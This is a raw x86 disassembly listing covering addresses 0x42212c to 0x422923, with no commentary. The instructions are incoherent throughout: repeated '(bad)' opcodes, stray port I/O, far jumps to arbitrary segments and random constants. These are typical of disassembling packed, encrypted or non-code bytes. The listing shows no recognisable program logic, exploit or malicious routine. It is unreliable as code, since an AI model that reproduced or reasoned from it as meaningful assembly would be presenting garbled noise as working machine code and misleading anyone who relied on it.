  42212c:	or     al,0xc0
  42212e:	mov    eax,ds:0x727f4d55
  422133:	xlat   BYTE PTR ds:[ebx]
  422134:	xor    edx,DWORD PTR [ebx+0x43]
  422137:	clc    
  422138:	inc    esi
  422139:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42213a:	mov    ch,0xf1
  42213c:	add    eax,0x9a00457b
  422141:	fisubr WORD PTR [edi]
  422143:	push   0x38508004
  422148:	loope  0x422117
  42214a:	adc    BYTE PTR [eax],bh
  42214c:	les    edi,FWORD PTR [edx-0x5f9b9a81]
  422152:	(bad)  
  422153:	cmp    al,0x25
  422155:	in     al,0x38
  422157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422158:	push   ecx
  422159:	xor    BYTE PTR [edx],ah
  42215b:	jge    0x422173
  42215d:	xlat   BYTE PTR ds:[ebx]
  42215e:	or     al,0xde
  422160:	and    edx,DWORD PTR [edi+esi*1+0x3a]
  422164:	packsswb mm2,mm5
  422167:	mov    ds:0x2302b389,al
  42216c:	jg     0x42210d
  42216e:	and    BYTE PTR ds:[edx+0x3971dfaf],ah
  422175:	dec    ecx
  422176:	mov    ebx,0x4563bd0b
  42217b:	imul   edx,DWORD PTR [ebp+0x63],0xa
  42217f:	mov    ecx,0xa5ce1454
  422184:	inc    ebx
  422185:	push   esi
  422186:	xor    al,0x14
  422188:	aad    0x40
  42218a:	mov    esi,0xb11cb3bb
  42218f:	mov    ebp,0xe8fea70
  422194:	mov    bh,0xa3
  422196:	fwait
  422197:	gs inc edi
  422199:	loope  0x422206
  42219b:	push   edi
  42219c:	mov    edi,0x50f543a2
  4221a1:	aam    0x8
  4221a3:	or     BYTE PTR [ecx],cl
  4221a5:	mov    dl,0xf6
  4221a7:	pop    esp
  4221a8:	or     al,0x95
  4221aa:	dec    esp
  4221ab:	cdq    
  4221ac:	push   esi
  4221ad:	popa   
  4221ae:	adc    eax,0x9412bf60
  4221b3:	loop   0x422228
  4221b5:	mov    ch,0x7b
  4221b7:	int    0xc0
  4221b9:	dec    ebp
  4221ba:	pop    es
  4221bb:	arpl   WORD PTR [eax-0x35],sp
  4221be:	retf   
  4221bf:	lea    esp,[edx-0x1357846d]
  4221c5:	or     DWORD PTR ds:0x800c9626,ecx
  4221cb:	not    ah
  4221cd:	jo     0x422172
  4221cf:	xchg   ebx,eax
  4221d0:	out    0xd9,eax
  4221d2:	cwde   
  4221d3:	sub    DWORD PTR [ecx-0x7f],ebp
  4221d6:	cmp    DWORD PTR ds:0x8d834a04,ebx
  4221dc:	fidiv  DWORD PTR [ebx]
  4221de:	in     eax,0xf1
  4221e0:	and    BYTE PTR [edi],0x77
  4221e3:	ret    0x9aae
  4221e6:	in     eax,dx
  4221e7:	retf   0x4499
  4221ea:	mov    cl,0x44
  4221ec:	adc    al,0x53
  4221ee:	adc    al,0x1e
  4221f0:	ins    BYTE PTR es:[edi],dx
  4221f1:	xchg   BYTE PTR [ebx-0x2a],ah
  4221f4:	shl    BYTE PTR [ecx+0x175061fb],1
  4221fa:	pop    ss
  4221fb:	dec    eax
  4221fc:	inc    ebp
  4221fd:	in     al,0x3e
  4221ff:	xchg   ebp,eax
  422200:	mov    ecx,0xc3595aaf
  422205:	push   ebx
  422206:	add    al,0x85
  422208:	push   ebx
  422209:	mov    al,ds:0x3d6e8629
  42220e:	xchg   ecx,eax
  42220f:	fst    DWORD PTR [eax+0x6d]
  422212:	sbb    dh,BYTE PTR [ebx+0x41]
  422215:	inc    ebp
  422216:	mov    ch,0xe9
  422218:	aaa    
  422219:	aam    0x83
  42221b:	aad    0xb5
  42221d:	mov    dh,0x1
  42221f:	loopne 0x42222f
  422221:	or     dh,BYTE PTR [ecx]
  422223:	mov    ebx,0x626f43ae
  422228:	adc    DWORD PTR [esi+eax*4],esi
  42222b:	inc    ecx
  42222c:	push   esi
  42222d:	popf   
  42222e:	push   ss
  42222f:	jno    0x422269
  422231:	mov    esp,DWORD PTR [esi+0x5052a619]
  422237:	cmp    BYTE PTR [esi+0x7f],0x54
  42223b:	clc    
  42223c:	stos   DWORD PTR es:[edi],eax
  42223d:	pop    ebp
  42223f:	std    
  422240:	dec    ecx
  422241:	sbb    BYTE PTR [ecx+0xae968b],dl
  422247:	sub    esi,eax
  422249:	scas   eax,DWORD PTR es:[edi]
  42224a:	mov    eax,ds:0xbbc1ea56
  42224f:	add    al,0xd3
  422251:	repz imul eax,DWORD PTR [edi+0x5],0x4e
  422256:	jl     0x422265
  422258:	cmp    BYTE PTR [eax],0x6
  42225b:	mov    ah,0x3
  42225d:	into   
  42225e:	aas    
  42225f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422260:	dec    esp
  422261:	ror    DWORD PTR [edx-0x2f6a4df9],cl
  422267:	ficomp WORD PTR [ecx-0x39cb18f2]
  42226d:	adc    BYTE PTR [ecx-0x221eb2a0],0xcd
  422274:	xchg   ebx,eax
  422275:	ficomp DWORD PTR [eax-0x26]
  422278:	pavgb  mm2,QWORD PTR [ecx+0x3b9c1f78]
  42227f:	xchg   ebx,eax
  422280:	xor    esi,ebx
  422282:	std    
  422283:	daa    
  422284:	jno    0x422270
  422286:	loopne 0x422245
  422288:	cmp    DWORD PTR [edx-0x31],eax
  42228b:	jmp    0x4222e7
  42228d:	cmp    ebp,DWORD PTR [eax+0x18e88881]
  422293:	jmp    0x503b21ac
  422298:	pop    ecx
  422299:	or     cl,bl
  42229b:	lahf   
  42229c:	aad    0xe
  42229e:	mov    ebp,0xbc140e40
  4222a3:	test   eax,0x671bc339
  4222a8:	jl     0x4222ea
  4222aa:	inc    edx
  4222ab:	inc    esp
  4222ac:	inc    ebx
  4222ad:	push   edi
  4222ae:	inc    edi
  4222af:	push   edi
  4222b0:	push   esi
  4222b1:	push   ebp
  4222b2:	outs   dx,DWORD PTR ds:[esi]
  4222b3:	pop    ebp
  4222b4:	mov    ds:0xa70474dc,eax
  4222b9:	fcom   QWORD PTR [eax-0x77fffe4f]
  4222bf:	push   es
  4222c0:	add    BYTE PTR [eax],al
  4222c2:	ret    
  4222c3:	and    dl,BYTE PTR [edx-0x3fb6cbc7]
  4222c9:	and    BYTE PTR [edx],dl
  4222cb:	outs   dx,DWORD PTR ds:[esi]
  4222cc:	mov    ss,WORD PTR ds:0x6b6f1090
  4222d2:	mul    DWORD PTR [eax]
  4222d4:	sahf   
  4222d5:	(bad)  
  4222d6:	fdivr  QWORD PTR [ecx+ebx*4+0x21693a4]
  4222dd:	mov    edx,0x10319e05
  4222e2:	fldcw  WORD PTR [esi]
  4222e4:	pop    ecx
  4222e5:	out    0x24,al
  4222e7:	xchg   esp,eax
  4222e8:	cld    
  4222e9:	in     eax,0x96
  4222eb:	fidiv  WORD PTR [edx]
  4222ed:	sub    ebx,DWORD PTR [edx]
  4222ef:	or     DWORD PTR [edi],ecx
  4222f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222f2:	sub    BYTE PTR [esi],cl
  4222f4:	adc    DWORD PTR [ebp+eiz*2-0x4a],ebp
  4222f8:	xchg   edx,eax
  4222f9:	mov    edx,fs
  4222fb:	xor    eax,0xcfb6921f
  422300:	icebp  
  422301:	shl    DWORD PTR [ecx-0xe53a51c],cl
  422307:	mov    cl,0x56
  422309:	aam    0x2d
  42230b:	lock push ebp
  42230d:	idiv   DWORD PTR [ebx-0x1b3a5be1]
  422313:	rol    DWORD PTR [ebx-0x3f],cl
  422316:	xchg   ebp,eax
  422317:	jae    0x422302
  422319:	adc    DWORD PTR [ebp+0x534585a7],esp
  42231f:	aad    0x8e
  422321:	or     eax,0x89dda05b
  422326:	mov    ah,0x29
  422328:	sbb    DWORD PTR [esi-0x5366534a],esi
  42232e:	mov    ebp,DWORD PTR [edx]
  422330:	data16 stos BYTE PTR es:[edi],al
  422332:	pop    ebx
  422333:	ins    DWORD PTR es:[edi],dx
  422334:	retf   
  422335:	les    esi,FWORD PTR [ecx]
  422337:	and    BYTE PTR [edi+0x1c],0x4b
  42233b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42233c:	xor    BYTE PTR [ebx+0x34],0x50
  422340:	scas   eax,DWORD PTR es:[edi]
  422341:	inc    DWORD PTR [ecx-0x185ccc41]
  422347:	cmp    bh,BYTE PTR [edx+0xa2f0008]
  42234d:	sbb    eax,0x82a3ce22
  422352:	xlat   BYTE PTR ds:[ebx]
  422353:	adc    BYTE PTR [edx-0x34],ch
  422356:	mov    ecx,0x89063a30
  42235b:	jg     0x4223c5
  42235d:	int3   
  42235e:	inc    edx
  42235f:	push   cs
  422360:	stc    
  422361:	(bad)  
  422362:	outs   dx,DWORD PTR ds:[esi]
  422363:	std    
  422364:	push   0xffffff9a
  422366:	inc    esp
  422367:	shr    BYTE PTR [ecx-0x45],cl
  42236a:	out    0xa7,al
  42236c:	jae    0x4223c1
  42236e:	fdivr  st,st(1)
  422370:	cli    
  422371:	lods   al,BYTE PTR ds:[esi]
  422372:	or     al,ch
  422374:	xchg   edi,eax
  422375:	in     eax,dx
  422376:	and    BYTE PTR ds:0x8d1c15dd,ch
  42237c:	mov    bh,0xde
  42237e:	(bad)  ds:0x4759974c
  422384:	cmp    eax,0xef3e0ae5
  422389:	adc    edx,DWORD PTR [eax+0x44]
  42238c:	dec    ebx
  42238d:	clc    
  42238e:	xor    ecx,ebx
  422390:	in     al,dx
  422391:	aam    0x78
  422393:	or     esi,edi
  422395:	inc    ebp
  422396:	addr16 inc esp
  422398:	ret    0x171f
  42239b:	adc    ecx,DWORD PTR [edx+0x1deca11f]
  4223a1:	add    eax,0xd0f4a181
  4223a6:	(bad)  
  4223a7:	repnz in eax,dx
  4223a9:	inc    ebx
  4223aa:	stos   BYTE PTR es:[edi],al
  4223ab:	add    eax,0x3fbcf4cf
  4223b0:	xchg   edi,eax
  4223b1:	push   ds
  4223b2:	inc    esi
  4223b3:	inc    esp
  4223b4:	fcomp  DWORD PTR [ebx]
  4223b6:	xor    BYTE PTR [ebx+0x7061816b],ah
  4223bc:	in     eax,0xbc
  4223be:	cmp    eax,esi
  4223c0:	add    BYTE PTR ds:0x97c9739e,bh
  4223c6:	and    ecx,DWORD PTR [ebx]
  4223c8:	push   0x37d0a792
  4223cd:	(bad)  [ecx+0x686e6ab1]
  4223d3:	shl    BYTE PTR [ecx-0x24],0x32
  4223d7:	adc    eax,esi
  4223d9:	dec    eax
  4223da:	js     0x42245a
  4223dc:	push   ds
  4223dd:	jmp    0x6cb7:0x64f08047
  4223e4:	fs push edx
  4223e6:	or     al,0x58
  4223e8:	adc    eax,0x21e88194
  4223ed:	(bad)  [ecx-0x53]
  4223f0:	push   0xd340cda
  4223f5:	in     al,dx
  4223f6:	test   BYTE PTR [edi-0x236354b3],ah
  4223fc:	jae    0x50696d7e
  422402:	sub    DWORD PTR [ebp-0x7f3144c1],ebx
  422408:	pop    ss
  422409:	aaa    
  42240a:	mov    ds:0x3dd294a9,eax
  42240f:	adc    cl,dh
  422411:	sti    
  422412:	sub    DWORD PTR [eax+0x11],ebx
  422415:	nop
  422416:	pop    edx
  422417:	rol    BYTE PTR [edi-0x34],cl
  42241a:	push   es
  42241b:	add    ah,cl
  42241d:	jp     0x42246d
  42241f:	addr16 in al,0x18
  422422:	ret    0x8735
  422425:	xchg   esi,eax
  422426:	in     al,dx
  422427:	cmp    al,0x42
  422429:	or     al,0xfe
  42242b:	add    edi,DWORD PTR [esi]
  42242d:	mov    esp,0xd132e172
  422432:	fld    DWORD PTR [ebx+0x4d8f3f94]
  422438:	(bad)  
  42243a:	retf   0x1c4e
  42243d:	sbb    ch,BYTE PTR ds:0x6b0d9e9a
  422443:	mov    ds:0x12923b3e,eax
  422448:	dec    edi
  422449:	lock push edi
  42244b:	mov    al,ds:0x48b37fd4
  422450:	jg     0x42248a
  422452:	add    eax,0xbec5022d
  422457:	(bad)  
  422459:	sbb    BYTE PTR [ebx],ch
  42245b:	add    DWORD PTR [edi],edx
  42245d:	push   ebp
  42245e:	lods   al,BYTE PTR ds:[esi]
  42245f:	fisttp QWORD PTR [edx+edi*1-0x473f6609]
  422466:	(bad)
  422469:	jg     0x4224a0
  42246b:	mov    ebx,0x5c4a238a
  422470:	popa   
  422471:	je     0x42247f
  422473:	lods   eax,DWORD PTR ds:[esi]
  422474:	xchg   edx,eax
  422475:	cmp    BYTE PTR [edi+0x55904842],al
  42247b:	pop    edx
  42247c:	(bad)  
  42247d:	(bad)  [ebx-0x794b431a]
  422483:	in     eax,dx
  422484:	jo     0x4224a1
  422486:	imul   ebx,DWORD PTR [ebp+0x38],0xffffff9d
  42248a:	inc    ebp
  42248b:	in     eax,0xe0
  42248d:	mov    bl,0xd5
  42248f:	(bad)  
  422491:	mov    bl,0x15
  422493:	mov    ebp,0xa189fe6b
  422498:	adc    eax,0xd14f248c
  42249d:	push   ds
  42249e:	ins    DWORD PTR es:[edi],dx
  42249f:	jae    0x4224c7
  4224a1:	push   0x939f028a
  4224a6:	push   ds
  4224a7:	in     al,dx
  4224a8:	add    DWORD PTR [ebx-0x5c],0x39
  4224ac:	test   BYTE PTR [edi],bl
  4224ae:	add    al,0xba
  4224b0:	mov    cl,BYTE PTR [edi*2+0x68bee7c]
  4224b7:	imul   ebp,DWORD PTR [ebp-0x29],0x74
  4224bb:	scas   eax,DWORD PTR es:[edi]
  4224bc:	fisttp WORD PTR [edx-0x79f1d601]
  4224c2:	dec    edi
  4224c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224c4:	adc    ch,BYTE PTR [eax+eiz*1]
  4224c7:	inc    ebx
  4224c8:	sub    eax,0x8f91b3a7
  4224cd:	lock mov eax,ds:0x616cf821
  4224d3:	jbe    0x4224e4
  4224d5:	sbb    ecx,DWORD PTR [esi+0x66]
  4224d8:	stos   DWORD PTR es:[edi],eax
  4224d9:	sub    edx,eax
  4224db:	xchg   edx,eax
  4224dc:	loope  0x422478
  4224de:	or     ecx,DWORD PTR [ebp-0x3e]
  4224e1:	enter  0x796d,0xe0
  4224e5:	xchg   ecx,eax
  4224e6:	addr16 (bad) 
  4224e8:	jae    0x4224d1
  4224ea:	retf   0x6daf
  4224ed:	mov    ds:0x8389ef47,eax
  4224f2:	imul   DWORD PTR [ecx*8-0x385e6495]
  4224f9:	int3   
  4224fa:	add    esi,0x36
  4224fd:	and    ah,dh
  4224ff:	xor    al,0x65
  422501:	adc    al,0x55
  422503:	mov    ebp,0x972f7e41
  422508:	pop    ecx
  422509:	inc    ebx
  42250a:	xchg   esp,eax
  42250b:	fistp  QWORD PTR [edi+0x295fdd79]
  422511:	test   ah,al
  422513:	mov    bp,0x30a1
  422517:	push   eax
  422518:	das    
  422519:	mov    eax,DWORD PTR [edi+0x47]
  42251c:	xlat   BYTE PTR ds:[ebx]
  42251d:	std    
  42251e:	mov    edi,0xa5204327
  422523:	and    eax,0xa3c943ef
  422528:	test   BYTE PTR [ebp*4+0x3aee3211],cl
  42252f:	inc    esp
  422530:	cdq    
  422531:	int    0xea
  422533:	fldlg2 
  422535:	or     ch,BYTE PTR [ecx]
  422537:	and    BYTE PTR [esp+esi*8-0x6fb6529e],0x30
  42253f:	xchg   ecx,eax
  422540:	mov    bh,0x67
  422542:	dec    ebx
  422543:	pop    esi
  422544:	dec    eax
  422545:	add    dh,BYTE PTR [edx+0x6f]
  422548:	xchg   edi,eax
  422549:	loop   0x42254c
  42254b:	scas   al,BYTE PTR es:[edi]
  42254c:	fild   DWORD PTR ds:0x987e
  422551:	and    BYTE PTR [ebx+0x20],ah
  422554:	test   eax,0x288a6fc1
  422559:	inc    esi
  42255a:	repz out dx,al
  42255c:	push   es
  42255d:	or     bl,bl
  42255f:	cmp    BYTE PTR [ebx+0x597a68a2],al
  422565:	arpl   WORD PTR [ebp+edx*8-0x63],bp
  422569:	xlat   BYTE PTR ds:[ebx]
  42256a:	sbb    ecx,DWORD PTR [edi]
  42256c:	popf   
  42256d:	addr16 cld 
  42256f:	jns    0x4225eb
  422571:	ficom  DWORD PTR [ecx-0x9]
  422574:	mov    ch,0x61
  422576:	inc    esp
  422577:	mov    es,WORD PTR [edx]
  422579:	mov    esp,0x9dc4d8f6
  42257e:	repnz aad 0xc
  422581:	leave  
  422582:	cli    
  422583:	jns    0x422530
  422585:	xchg   DWORD PTR [edi],esp
  422587:	cdq    
  422588:	pop    edx
  422589:	(bad)  
  42258a:	stc    
  42258b:	jp     0x422558
  42258d:	imul   eax,edi,0x890acf88
  422593:	outs   dx,DWORD PTR ds:[esi]
  422594:	ret    0x2b4a
  422597:	stos   DWORD PTR es:[edi],eax
  422598:	in     al,dx
  422599:	sti    
  42259a:	test   BYTE PTR [esi+ebx*4-0x4a6f02ac],al
  4225a1:	(bad)  
  4225a2:	jmp    0xadfb:0x5ed872ca
  4225a9:	add    DWORD PTR [edi+ecx*2-0x7a],ecx
  4225ad:	inc    esp
  4225ae:	xchg   ebp,eax
  4225af:	sbb    ecx,eax
  4225b1:	jmp    0x4225bb
  4225b3:	mov    ch,0xd0
  4225b5:	addr16 (bad) 
  4225b7:	adc    esi,DWORD PTR [ebp-0xaa394d9]
  4225bd:	in     eax,dx
  4225be:	mov    dl,0x60
  4225c0:	dec    DWORD PTR [edx+0x55]
  4225c3:	mov    edx,ebp
  4225c5:	clc    
  4225c6:	jae    0x42261d
  4225c8:	mov    ebp,0x608f3086
  4225cd:	add    BYTE PTR ds:0xe9f7dfc4,dh
  4225d3:	jns    0x4225d8
  4225d5:	or     dl,dl
  4225d7:	jmp    0x37b4:0x85f206eb
  4225de:	xchg   ebp,eax
  4225df:	push   ebp
  4225e0:	pop    ecx
  4225e1:	outs   dx,BYTE PTR ds:[esi]
  4225e2:	in     al,0x75
  4225e4:	cmp    al,0xbe
  4225e6:	dec    ebx
  4225e7:	xor    eax,0x51778ee4
  4225ec:	cmc    
  4225ed:	xchg   esp,eax
  4225ee:	bound  esi,QWORD PTR [edx+0x4846354]
  4225f4:	aas    
  4225f5:	arpl   WORD PTR [ebx+0x5614b426],bx
  4225fb:	sub    ch,bh
  4225fd:	je     0x42263f
  4225ff:	loope  0x4225e8
  422601:	inc    ebx
  422602:	lds    eax,FWORD PTR [ebp-0x47bcc2cc]
  422608:	jb     0x422613
  42260a:	dec    ecx
  42260b:	in     al,0xd9
  42260d:	mov    dh,0x1
  42260f:	cwde   
  422610:	xchg   esp,eax
  422611:	sub    edx,eax
  422613:	loopne 0x4225ce
  422615:	fcom   QWORD PTR [edx+0x20892543]
  42261b:	shl    BYTE PTR [ebx],0x36
  42261e:	repz leave 
  422620:	int    0xdf
  422622:	outs   dx,BYTE PTR ds:[esi]
  422623:	psubusb mm1,QWORD PTR [esi+0x7a]
  422627:	pop    ss
  422628:	jg     0x422631
  42262a:	inc    ebx
  42262b:	aaa    
  42262c:	js     0x422622
  42262e:	loop   0x422606
  422630:	out    0xe2,eax
  422632:	rcl    BYTE PTR [ebp-0x71],1
  422635:	addr16 fs add eax,0x6f66b5a0
  42263c:	push   ebp
  42263d:	or     ebx,DWORD PTR [esi-0x63e22e34]
  422643:	rol    DWORD PTR [bp+si+0x5f],0x87
  422648:	ret    
  422649:	dec    ebx
  42264a:	dec    ebx
  42264b:	or     edx,edx
  42264d:	add    eax,0xea30565c
  422652:	loop   0x4226c2
  422654:	dec    edx
  422655:	repz jp 0x42265c
  422658:	dec    ebp
  422659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42265a:	mov    bh,0xad
  42265c:	stos   BYTE PTR es:[edi],al
  42265d:	dec    ebx
  42265e:	sub    BYTE PTR [esi+ecx*2+0x7a],0xb1
  422663:	fistp  WORD PTR [eax-0x63f5a142]
  422669:	(bad)  
  42266a:	dec    esp
  42266b:	push   ss
  42266c:	push   ecx
  42266d:	cmp    DWORD PTR [esi+0x1c],ecx
  422670:	mov    dh,0xee
  422672:	aas    
  422673:	shl    BYTE PTR [edx],1
  422675:	jbe    0x42260b
  422677:	push   ecx
  422678:	or     eax,0xf823333b
  42267d:	stc    
  42267e:	loope  0x422697
  422680:	outs   dx,BYTE PTR ds:[esi]
  422681:	push   ebp
  422682:	and    eax,0xbf00451a
  422687:	mov    DWORD PTR [edi-0x74],edx
  42268a:	mov    edx,0x8f1a07cf
  42268f:	add    al,0x90
  422691:	adc    cl,BYTE PTR [eax+edx*2+0x6347e38d]
  422698:	xchg   DWORD PTR [ebx-0x36],esp
  42269b:	cli    
  42269c:	dec    esp
  42269d:	ds inc esp
  42269f:	adc    DWORD PTR [ebx],ebx
  4226a1:	(bad)  
  4226a2:	fninit 
  4226a4:	out    0xab,eax
  4226a6:	adc    BYTE PTR [edx],ch
  4226a8:	loop   0x422693
  4226aa:	jae    0x4226ee
  4226ac:	sub    al,0xe5
  4226ae:	mov    WORD PTR [eax+0x67],cs
  4226b1:	and    ebx,DWORD PTR [edi]
  4226b3:	idiv   BYTE PTR [esi+0x1906ee11]
  4226b9:	lods   eax,DWORD PTR ds:[esi]
  4226ba:	test   BYTE PTR [edx],al
  4226bc:	test   al,0xe6
  4226be:	sub    DWORD PTR [esi-0xd],esi
  4226c1:	dec    eax
  4226c2:	dec    ebp
  4226c3:	pop    esp
  4226c4:	mov    esp,0x1f8bd393
  4226c9:	imul   eax,edx,0x21
  4226cc:	cdq    
  4226cd:	dec    esp
  4226ce:	mov    edi,0xaf125e5a
  4226d3:	push   es
  4226d4:	clc    
  4226d5:	add    ebx,DWORD PTR ds:0x4670f2f9
  4226db:	xor    dl,BYTE PTR [ebp+0x45]
  4226de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226df:	and    ebx,esp
  4226e1:	idiv   BYTE PTR [edi+0x44be807e]
  4226e7:	repz clc 
  4226e9:	push   ebp
  4226ea:	shl    BYTE PTR ds:0xb9be4910,1
  4226f0:	push   DWORD PTR [ebp-0x78]
  4226f3:	outs   dx,DWORD PTR ds:[esi]
  4226f4:	dec    ecx
  4226f5:	dec    ebp
  4226f6:	data16 adc dl,BYTE PTR [eax+0x17]
  4226fa:	adc    DWORD PTR [ebp+0x354913dd],0xfffffff5
  422701:	inc    ecx
  422702:	test   BYTE PTR [ecx-0x7f],0x3a
  422706:	test   ecx,0x7a714097
  42270c:	sbb    DWORD PTR [esi+0x5],0xe7d32a37
  422713:	in     eax,0x46
  422715:	retf   0x7ca7
  422718:	push   esp
  422719:	lea    ebx,[ebp-0x67967510]
  42271f:	mov    esp,0x4343f75e
  422724:	push   ss
  422725:	stc    
  422726:	out    dx,al
  422727:	enter  0x750b,0x44
  42272b:	and    edi,DWORD PTR [eax+edx*2-0x5c]
  42272f:	jns    0x4226bf
  422731:	inc    edx
  422732:	ds repz mov esp,es
  422736:	ret    
  422737:	pop    edx
  422738:	retf   
  422739:	jno    0x422794
  42273b:	jg     0x4226c3
  42273d:	daa    
  42273e:	jno    0x42275a
  422740:	rol    ebp,0xbb
  422743:	xchg   DWORD PTR [edx-0x61],ebx
  422746:	sub    eax,0x6b84a900
  42274b:	lock lods al,BYTE PTR ds:[esi]
  42274d:	les    esi,FWORD PTR ds:0xe397797b
  422753:	jnp    0x422763
  422755:	fcom   DWORD PTR [edx-0x7866cbd9]
  42275b:	fabs   
  42275d:	push   ss
  42275e:	jns    0x422777
  422760:	(bad)  
  422761:	mov    eax,0xb88b4d12
  422766:	xchg   ebp,eax
  422767:	dec    ebp
  422768:	int    0xe
  42276a:	lds    edx,FWORD PTR [eax]
  42276c:	jl     0x42277e
  42276e:	cmp    bh,BYTE PTR [ecx+0x52]
  422771:	xor    DWORD PTR [edi+edx*2-0x445195c5],edx
  422778:	std    
  422779:	(bad)
  42277c:	pop    ebp
  42277d:	mov    ah,0x3
  42277f:	shl    DWORD PTR [eax-0x77],1
  422782:	shl    DWORD PTR [ebp-0x6df06eeb],cl
  422788:	sbb    eax,0x3f095432
  42278d:	bound  ebp,QWORD PTR [edi+0x2d]
  422790:	test   ecx,ebx
  422792:	mov    al,0x1
  422794:	pop    ebx
  422795:	cmp    BYTE PTR [esp+ebp*8],ch
  422798:	icebp  
  422799:	xor    eax,0x5e29ccf9
  42279e:	(bad)  [eax+ebp*1-0x58]
  4227a2:	inc    esi
  4227a3:	add    bh,BYTE PTR ds:0xb279a2b2
  4227a9:	xor    al,0xb7
  4227ab:	push   edx
  4227ac:	push   ecx
  4227ad:	xor    ebx,DWORD PTR [ebx+0x4c6f6886]
  4227b3:	loopne 0x42275e
  4227b5:	sbb    ah,BYTE PTR [edx]
  4227b7:	xlat   BYTE PTR ds:[ebx]
  4227b8:	loop   0x42279f
  4227ba:	popa   
  4227bb:	and    BYTE PTR [edx-0x7511ca0d],al
  4227c1:	pop    eax
  4227c2:	test   dh,bl
  4227c4:	adc    al,0x9c
  4227c6:	inc    ebx
  4227c7:	xchg   ebp,eax
  4227c8:	out    dx,al
  4227c9:	cdq    
  4227ca:	jnp    0x42283a
  4227cc:	mov    ebp,0xd71a4024
  4227d1:	mov    eax,ds:0xd2ce71d0
  4227d6:	xor    al,0xfa
  4227d8:	out    dx,eax
  4227d9:	std    
  4227da:	push   esp
  4227db:	push   ecx
  4227dc:	push   ds
  4227dd:	jg     0x42285d
  4227df:	fadd   DWORD PTR [ebx]
  4227e1:	(bad)  
  4227e3:	jnp    0x4227b8
  4227e5:	pop    DWORD PTR [edx+eiz*2+0x219b9d34]
  4227ec:	(bad)  
  4227ed:	in     al,dx
  4227ee:	xor    bh,BYTE PTR [edx+0x74766d17]
  4227f4:	sbb    al,BYTE PTR [ebp-0x20ae6736]
  4227fa:	jbe    0x42287a
  4227fc:	loopne 0x4227f9
  4227fe:	push   esp
  4227ff:	ffree  st(0)
  422801:	out    0x40,eax
  422803:	adc    ebx,ebp
  422805:	(bad)  
  422806:	sbb    BYTE PTR [ebp+edx*4-0x68],bl
  42280a:	push   esi
  42280b:	sub    DWORD PTR [edx-0x4d7e1adf],0x99e64ffd
  422815:	jno    0x422798
  422817:	ror    BYTE PTR [esi],0x14
  42281a:	outs   dx,DWORD PTR ds:[esi]
  42281b:	into   
  42281c:	mov    esi,0xf1d83b4f
  422821:	adc    al,0xdf
  422823:	test   eax,0xe7e73e86
  422828:	test   eax,0x5d72a261
  42282d:	push   ds
  42282e:	out    0xc3,al
  422830:	imul   esp,DWORD PTR [ebp+eiz*2-0x2c],0x7ffcb3bd
  422838:	bound  edx,QWORD PTR [edi+esi*4-0x69]
  42283c:	mov    WORD PTR [ebx+0x53],?
  42283f:	loopne 0x4227e1
  422841:	loope  0x422808
  422843:	fsubp  st(5),st
  422845:	mov    edx,0x6f017ee8
  42284a:	xchg   esi,eax
  42284b:	sti    
  42284c:	(bad)  
  42284d:	cmp    eax,0xb640bfff
  422852:	jb     0x42282c
  422854:	push   esi
  422855:	add    al,0xfd
  422857:	cld    
  422858:	mov    ch,0x44
  42285a:	mov    esp,0xf5935266
  42285f:	loop   0x42282b
  422861:	mov    ah,0x29
  422863:	push   edx
  422864:	enter  0x56f4,0x72
  422868:	push   esi
  422869:	jmp    0x4228dd
  42286b:	sub    ebp,edx
  42286d:	cmp    DWORD PTR [ebp-0x4c],edx
  422870:	add    al,0x8d
  422872:	push   ecx
  422873:	or     BYTE PTR [edi+ebp*8+0x2c3bc6ca],dl
  42287a:	dec    ebx
  42287b:	pop    ds
  42287c:	call   0x70c6:0x2f0cc893
  422883:	push   cs
  422884:	loopne 0x4228f6
  422886:	mov    dl,0xfc
  422888:	pop    esi
  422889:	or     eax,DWORD PTR ds:0xa61d7b58
  42288f:	stos   BYTE PTR es:[edi],al
  422890:	in     al,0x8a
  422892:	je     0x422907
  422894:	dec    esi
  422895:	inc    esp
  422896:	jno    0x422824
  422898:	out    dx,al
  422899:	mov    BYTE PTR [ebx-0x4e36d973],dl
  42289f:	add    al,0x1f
  4228a1:	xor    edx,DWORD PTR [ebp-0x7fbff408]
  4228a7:	mov    ds:0x4992b645,al
  4228ac:	adc    DWORD PTR [edx-0x23e8dab0],esi
  4228b2:	mov    bl,0x70
  4228b4:	js     0x4228e1
  4228b6:	sbb    ah,al
  4228b8:	add    eax,0xb5856bce
  4228bd:	push   esi
  4228be:	idiv   esp
  4228c0:	ret    
  4228c1:	int    0x51
  4228c3:	push   ebp
  4228c4:	imul   edi,ecx,0x86d73f22
  4228ca:	je     0x4228f6
  4228cc:	imul   DWORD PTR [edi-0xca2e63e]
  4228d2:	test   esp,eax
  4228d4:	inc    ecx
  4228d5:	mov    ah,0x87
  4228d7:	and    esp,ebx
  4228d9:	xor    BYTE PTR [ecx],dl
  4228db:	jle    0x422916
  4228dd:	cli    
  4228de:	ins    BYTE PTR es:[edi],dx
  4228df:	sub    eax,0x237be69b
  4228e4:	mov    DWORD PTR [edi+0x5f],esp
  4228e7:	pusha  
  4228e8:	adc    ecx,DWORD PTR fs:[ebx+0x3b]
  4228ec:	cld    
  4228ed:	pop    es
  4228ee:	ss enter 0x8a33,0x5a
  4228f3:	outs   dx,DWORD PTR ds:[esi]
  4228f4:	cdq    
  4228f5:	cli    
  4228f6:	in     al,0xbf
  4228f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4228f9:	loopne 0x422916
  4228fb:	mov    ds:0xd016615b,al
  422900:	outs   dx,BYTE PTR ds:[esi]
  422901:	nop
  422902:	mov    ebx,0x907f0bc1
  422907:	pusha  
  422908:	mov    dl,dl
  42290a:	jecxz  0x4228fc
  42290c:	inc    edx
  42290d:	and    al,0x4f
  42290f:	in     al,0x66
  422911:	pop    ecx
  422912:	lds    ebp,FWORD PTR [ecx]
  422914:	jb     0x42290d
  422916:	aad    0x6a
  422918:	test   eax,0x3fd25d2e
  42291d:	mov    edi,0x49b2de8b
  422922:	in     al,dx
  422923:	mov    ecx,DWORD PTR [edx]
